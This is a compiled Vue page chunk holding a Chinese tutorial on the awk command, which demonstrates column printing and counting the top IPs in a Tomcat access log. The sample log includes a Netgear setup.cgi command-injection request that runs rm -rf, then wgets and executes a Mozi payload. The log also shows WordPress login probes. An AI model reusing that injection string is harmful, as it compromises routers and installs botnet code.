(window.webpackJsonp=window.webpackJsonp||[]).push([[110],{513:function(s,t,a){"use strict";a.r(t);var n=a(27),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h3",{attrs:{id:"awk-命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#awk-命令"}},[s._v("#")]),s._v(" awk 命令")]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("awk")]),s._v(" "),a("p",[s._v("awk([ɔk]),这个命令玩的转不转，就是Linux菜不菜的分水岭了")]),s._v(" "),a("p",[s._v("grep命令中已经提到了，Linux有三个重要的命令，一个是grep，一个是awk，还有一个是sed")]),s._v(" "),a("p",[s._v("我在这里介绍几个我工作中用到的案例")])]),s._v(" "),a("h4",{attrs:{id:"先讲讲怎么用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#先讲讲怎么用"}},[s._v("#")]),s._v(" 先讲讲怎么用")]),s._v(" "),a("p",[s._v("我们先拿一个tomcat的access(部分)日志做demo")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("288.208")]),s._v(".60.115 - connector-87 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:20:38:14 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET /webapps/bb-silkV-bb_bb60/dist/js/libs/jquery.min.js HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33637")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"session_id=7AAE94F365F73328FBA4DAB21173D6D1; s_session_id=3A8546E486A7AADABCB39E9EB95E0DD3; web_client_cache_guid=9b548065-a3b9-42cc-be7b-cf2974c5f332"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("72")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33637")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("88.228")]),s._v(".10.180 - connector-110 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:20:57:20 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET /js/zimbraMail/share/model/ZmSettings.js HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8158")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("129")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8158")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("222.82")]),s._v(".47.4 - connector-116 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:20:59:54 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET / HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("206")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("206")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("222.23")]),s._v(".34.151 - connector-103 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:21:05:39 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"POST //webapps/software-updates/registrar/checkCallbackToken HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" - "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"AHC/1.0"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" -\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.35")]),s._v(".168.245 - connector-108 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:21:18:41 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET / HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("206")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("206")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.35")]),s._v(".168.245 - connector-82 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:21:18:42 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET / HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("193")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 zgrab/0.x"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("193")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.248")]),s._v(".147.78 - - - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:21:22:42 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET /wptest/wp-login.php HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("301")]),s._v(" - "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" -\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.248")]),s._v(".147.78 - connector-89 - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:21:22:44 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET /wptest/wp-login.php HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8158")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("32")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8158")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.97")]),s._v(".174.122 - - - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:22:46:45 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("301")]),s._v(" - "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" -\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123.159")]),s._v(".6.192 - - - "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("/May/2019:22:46:47 +0800"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"POST /cgi-bin/mainfunction.cgi HTTP/1.1"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("301")]),s._v(" - "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"XTC"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" -\n")])])]),a("p",[s._v("使用下面的命令")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("root@xxx tomcat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# awk '{print $1}' access-log.2019-05-27.txt")]),s._v("\n")])])]),a("p",[s._v("返回结果")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("47.95")]),s._v(".28.143\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("162.212")]),s._v(".114.160\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("162.243")]),s._v(".129.111\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("144.217")]),s._v(".207.24\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.82")]),s._v(".144.251\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.82")]),s._v(".144.251\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80.82")]),s._v(".70.187\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.82")]),s._v(".144.251\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("218.161")]),s._v(".125.93\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("107.23")]),s._v(".34.151\n")])])]),a("p",[s._v("那如果使用$2呢？")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("root@xxx tomcat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# awk '{print $2}' access-log.2019-05-27.txt")]),s._v("\n")])])]),a("p",[s._v("返回结果")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("-\n-\n-\n-\n-\n-\n-\n-\n-\n-\n-\n-\n-\n")])])]),a("p",[s._v("看得出来，这个命令是按列输出的，默认以空格分割，并且awk '{print $1}' xxx.txt为输出第一列")]),s._v(" "),a("p",[s._v("而不是$0,实际上awk '{print $0}' xxx.txt是全列输出")]),s._v(" "),a("h4",{attrs:{id:"实践一下"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#实践一下"}},[s._v("#")]),s._v(" 实践一下")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" access-log.2019-05-27.txt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sort")]),s._v("  -t "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'-'")]),s._v(" -k1n "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'{print "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v("}'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("uniq")]),s._v(" -c"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sort")]),s._v(" -k1nr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("head")]),s._v(" -10\n")])])]),a("p",[s._v("这条命令的作用是统计访问量排在前10的IP")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("64")]),s._v(".x64.104.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("107")]),s._v(".x23.34.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v(".x55.192.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("171")]),s._v(".x67.70.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192")]),s._v(".x35.168.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("193")]),s._v(".x174.89.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".x82.144.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v(".x82.70.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("104")]),s._v(".x248.147.xx\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("106")]),s._v(".x11.157.xx\n")])])]),a("p",[s._v("解释一下（这就需要一点知识的整合了）")]),s._v(" "),a("p",[s._v("把文件输出出来，没什么毛病")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" access-log.2019-05-27.txt\n")])])]),a("p",[s._v("Linux管道符开始传递，将上一步输出的结果，按'-'分割，k1n的意思是按分割后的第一列进行数字比较排序")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sort")]),s._v("  -t "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'-'")]),s._v(" -k1n \n")])])]),a("p",[s._v("awk命令打印第一行")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'{print "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v("}'")]),s._v("\n")])])]),a("p",[s._v("由于上上步已经sort排序了，并且awk只打印了第一列，IP列，所以uniq不用排序，直接可以distinct")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("uniq")]),s._v(" -c\n")])])]),a("p",[s._v("uniq后，第一列就变成count数了，这个时候再sort一下，k1nr，最后这个参数r就是倒序的意思")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sort")]),s._v(" -k1nr\n")])])]),a("p",[s._v("最最后再head -10，从前到后选10个")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("head")]),s._v(" -10\n")])])]),a("h4",{attrs:{id:"扩展"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#扩展"}},[s._v("#")]),s._v(" 扩展")]),s._v(" "),a("p",[s._v("除了上面讲的pring $1")]),s._v(" "),a("p",[s._v("awk的花样还很多，输出时可以自定义分隔符，输入时也可以自定义分隔符\n甚至输出时可以写判断条件，还可以写逻辑函数，这些我就不多介绍了，实际用到时，再百度即可")]),s._v(" "),a("p",[s._v("不过这个命令真的很重要，玩的溜，在服务器上可以做很多事半功倍的事情，唯手熟尔啦😎")])])}),[],!1,null,null,null);t.default=e.exports}}]);